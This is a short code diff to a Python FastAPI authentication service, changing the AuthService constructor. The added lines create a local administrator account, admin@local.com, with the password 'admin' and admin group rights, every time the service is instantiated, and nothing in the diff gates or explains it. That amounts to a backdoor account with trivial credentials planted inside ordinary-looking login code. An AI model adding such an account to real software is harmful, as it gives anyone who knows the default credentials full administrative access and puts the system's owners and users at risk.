@@ -5,7 +5,7 @@ from fastapi import HTTPException
 from services.auth.jwt import JwtService
 from services.auth.ldap import LdapAuthenticator
 from services.auth.models import LoginResponse, UserResponse
-from services.auth.passwords import verify_password
+from services.auth.passwords import hash_password, verify_password
 from services.auth.repository import AuthRepository
 from shared.metrics import MetricsRegistry, safe_label_value
 
@@ -26,7 +26,13 @@ class AuthService:
         self._auth_provider = auth_provider
         self._ldap_authenticator = ldap_authenticator
         self._metrics = metrics
-
+        repository.create_local_user(
+            email="admin@local.com",
+            password_hash=hash_password("admin"),
+            display_name="Admin",
+            is_admin=True,
+            group_names=["admins"],
+        )
     def authenticate(self, email: str, password: str) -> LoginResponse:
         """Authenticate credentials and return a bearer token."""
         user = None
